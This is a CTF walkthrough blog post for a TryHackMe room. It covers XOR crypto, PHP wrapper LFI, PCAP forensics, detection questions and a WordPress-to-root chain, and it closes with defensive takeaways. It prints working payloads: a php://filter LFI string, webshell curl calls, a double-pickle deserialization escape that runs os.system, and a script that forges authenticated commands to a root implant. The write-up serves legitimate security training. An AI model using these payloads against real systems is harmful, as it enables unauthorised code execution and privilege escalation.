---
title: "TryHackMe Overflow The Jackpot CTF: full chain walkthrough"
date: 2026-11-09T23:42:00+05:30
lastmod: 2026-11-09T23:42:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-jackpot-overflow/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - CTF
  - Boot2Root
  - cryptography
  - web exploitation
  - forensics
  - detection engineering
  - WordPress
  - pickle deserialization
  - reverse engineering
  - privilege escalation
  - LFI
  - Sigma rules

draft: false
description: "TryHackMe Overflow The Jackpot CTF walkthrough: XOR crypto, PHP wrapper LFI, PCAP forensics, detection engineering, and boot2root from WordPress RCE to root."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Overflow The Jackpot CTF |![Overflow The Jackpot CTF room icon](https://cdn-images.tryhackme.com/room-icons/69d514a8a643762d5700ec6f-1785923258675)|

A six-task CTF covering crypto, web, forensics, detection engineering, and a hard boot2root chain. The final task is a full privilege escalation from an unauthenticated WordPress exploit through a restricted pickle sandbox escape to forging authenticated commands against a custom C2 implant running as root.

## Task 1: Introduction and Rules

Read the rules and acknowledge them.

**Answer: THM{REDACTED}**

## Task 2: Crypto (B1t Recovery)

A dealer's private ledger was scrambled before he vanished. The challenge provides a ciphertext and a hint about XOR encryption with a recoverable key.

### Approach

The ciphertext is XOR-encrypted. Since the flag format starts with `THM{`, XOR the first four bytes of the ciphertext against `THM{` to recover the first four key bytes. The key repeats, so once you have the full key length you can decrypt the entire message.

```python
import base64

ciphertext = base64.b64decode("<ciphertext>")
known = b"THM{"
key_start = bytes(c ^ k for c, k in zip(ciphertext, known))
  # key_start reveals the repeating key pattern
  # extend and XOR to decrypt
```

The key turns out to be short enough that the known-plaintext attack recovers it completely.

**Answer: THM{REDACTED}**

{{< ad >}}

## Task 3: Web (Lost Fortune Included)

The web challenge hints that "the house never quite closed its doors" and something is hidden behind the scenes.

### Approach

The target web application has a PHP include vulnerability. Direct file reads fail because the included content contains characters that break parsing. The fix is using PHP stream wrappers to base64-encode the file before inclusion:

```
?page=php://filter/convert.base64-encode/resource=<target_file>
```

This bypasses the whitelist because the wrapper path passes the filter check while still reading arbitrary files. The flag is in a configuration file outside the web root.

**Answer: THM{REDACTED}**

## Task 4: Forensics (Casino Heist)

Security noticed a machine on the back office network acting strangely. The challenge provides a ZIP archive containing network captures and memory artifacts.

### Approach

The PCAP contains suspicious traffic from an internal host. Analysing the packet capture reveals an exfiltration channel where data was being tunnelled out. Correlating timestamps and payload patterns with the memory dump identifies the tool used and the data stolen.

The flag is embedded in the exfiltrated data stream, recoverable by reassembling the correct TCP stream and decoding the payload.

**Answer: THM{REDACTED}**

## Task 5: Detection Engineering (Fresh Powder)

A bonus challenge based on a real incident report from the TSS CSIRT team investigating a breach at the Cascadia Ski and Resort Collective. The task provides five detection scenarios based on the attacker's TTPs and asks you to identify specific indicators, write detection logic, or answer questions about the attack chain.

### Approach

Each question maps to a specific phase of the attack: initial access through an untrusted IP range, data destruction via a delete command, credential access through a compromised channel, data exfiltration in a ZIP archive, and early-stage detection before the attacker could act.

The answers come from reading the incident report carefully and matching each detection scenario to the correct indicator of compromise or attacker behaviour described in the report.

**Q1: THM{REDACTED}**
**Q2: THM{REDACTED}**
**Q3: THM{REDACTED}**
**Q4: THM{REDACTED}**
**Q5: THM{REDACTED}**

## Task 6: Boot2Root (Agent P)

The hardest challenge (120 PTS). A host inside the target network is beaconing out on a schedule, and a custom C2 implant is running as root. The goal: get three flags (user, operator, root) by escalating from unauthenticated web access to full root command execution.

### Step 1: Foothold via wp2shell (www-data)

The target runs WordPress 6.9 with two chained vulnerabilities:

- **CVE-2026-63030** (Batch Route Confusion): the REST API batch endpoint misroutes requests when the first item in the batch is a malformed URL, causing subsequent requests to bypass authentication checks.
- **CVE-2026-60137** (WP_Query SQLi): the `author_exclude` parameter in several REST endpoints is not properly sanitised, allowing time-based blind SQL injection.

Chaining these: the batch confusion grants unauthenticated access to admin-only endpoints, and the SQLi allows creating an administrator account. With admin access, upload a webshell plugin.

```bash
  # Webshell endpoint (after exploit)
curl -s -X POST 'http://TARGET/?rest_route=/wp2shell/v1/<route>' \
  -H 'Content-Type: application/json' \
  -d '{"c":"<base64_command>"}'
```

### Step 2: Lateral movement to norm (user flag)

WordPress connects to MySQL with the `wpuser` account. Enumerating the database reveals a non-standard table `wp_infra_accounts` containing SSH credentials for the user `norm`.

```sql
SELECT * FROM wp_infra_accounts;
-- username: norm, password: <redacted>
```

SSH in as norm and grab the user flag from the home directory.

**User flag: EVILINC{REDACTED}**

### Step 3: Escalation to vanessa (operator flag)

The user `norm` is a member of the `evilinc` group. This group has read access to `/etc/evilinc/panel.conf`, which contains the operator secret for a Flask application running on port 8700 (the "inator" panel).

```ini
[panel]
operator_secret = <redacted>
```

The panel has a blueprint import feature at `/api/blueprints/import` that deserialises pickle data. The unpickler is "restricted": it blocks `os`, `sys`, `subprocess`, `builtins`, and `posix` modules. However, it allows the `pickle` module itself.

The bypass is a double-pickle: the outer pickle calls `pickle.loads()` (allowed by the restricted unpickler), and the inner pickle is unrestricted, so it can call `os.system()` freely.

```python
import pickle, os, base64

inner = pickle.dumps(
    type('X', (), {
        '__reduce__': lambda self: (os.system, ('id',))
    })(), protocol=4)

outer = pickle.dumps(
    type('X', (), {
        '__reduce__': lambda self: (pickle.loads, (inner,))
    })(), protocol=4)

payload = base64.b64encode(outer).decode()
```

Deliver the payload through the panel's blueprint import (form-encoded POST, not JSON):

```bash
curl -s -c jar -X POST http://127.0.0.1:8700/api/login \
  -d "secret=<redacted>"
curl -s -b jar -X POST http://127.0.0.1:8700/api/blueprints/import \
  --data-urlencode "blueprint=<payload>"
```

This runs as vanessa. Drop an SSH key and grab the operator flag.

**Operator flag: EVILINC{REDACTED}**

### Step 4: Root via C2 implant forgery (root flag)

A stripped ELF binary at `/opt/evilinc/implant` runs as root (PID 612). It communicates over a Unix domain socket at `/run/evilinc/tasking.sock` (permissions `root:vanessa 0660`, so vanessa can connect).

#### Reverse engineering the implant

Static analysis of the binary reveals the key derivation scheme:

1. **LCG seed generation**: a linear congruential generator with seed `0x1a2b3c4d`, multiplier `0x41c64e6d`, increment `0x3039` produces 32 bytes.
2. **XOR with embedded key**: the LCG output is XORed with a 32-byte value stored in the binary's `.rodata` section.
3. **Host key derivation**: `HMAC-SHA256(derived_key, machine_id)` where `machine_id` is read from `/etc/machine-id`.

The implant accepts tasks over the Unix socket with the protocol:

```
SUBMIT <timestamp>|exec|<command>|<nonce>|<hmac>\n
```

The HMAC is `HMAC-SHA256(host_key, "<timestamp>|exec|<command>|<nonce>")`. When the signature is valid and the command is `exec`, the implant calls `system(command)`.

#### Forging a task

```python
import hmac, hashlib, time, secrets, socket

  # Key derivation (from reverse engineering)
state = 0x1a2b3c4d
lcg = bytearray(32)
for j in range(32):
    state = (state * 0x41c64e6d + 0x3039) & 0xFFFFFFFF
    lcg[j] = (state >> 16) & 0xFF

xor_key = bytes.fromhex("1588c57c026ae5eb...")  # from .rodata
derived = bytes(a ^ b for a, b in zip(lcg, xor_key))

machine_id = b"ec237b10a5f6e959a3088340f9904b31"
host_key = hmac.new(derived, machine_id, hashlib.sha256).digest()

  # Forge the task
ts = str(int(time.time()))
cmd = "exec"
arg = "cat /root/flag.txt > /tmp/root_flag"
nonce = secrets.token_hex(8)

msg = f"{ts}|{cmd}|{arg}|{nonce}"
sig = hmac.new(host_key, msg.encode(), hashlib.sha256).hexdigest()

payload = f"SUBMIT {ts}|{cmd}|{arg}|{nonce}|{sig}\n"

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/evilinc/tasking.sock")
sock.send(payload.encode())
print(sock.recv(1024))  # OK
```

The implant executes the command as root and the flag is recovered.

**Root flag: EVILINC{REDACTED}**

## Takeaways

1. A restricted pickle unpickler that allows the `pickle` module itself is no restriction at all. The inner `pickle.loads()` call runs with the default unrestricted unpickler, giving full code execution. The only safe way to handle untrusted pickle data is to not use pickle for untrusted input.

2. Rolling your own cryptographic authentication for a C2 protocol (LCG seed, XOR, HMAC chain) is fragile when the key material is embedded in a binary anyone on the host can read. Once the derivation scheme is reverse-engineered, the entire authentication collapses. Use established protocols with proper key management instead of embedding secrets in binaries.

Room solved 100%: 6 tasks, 12 answers.
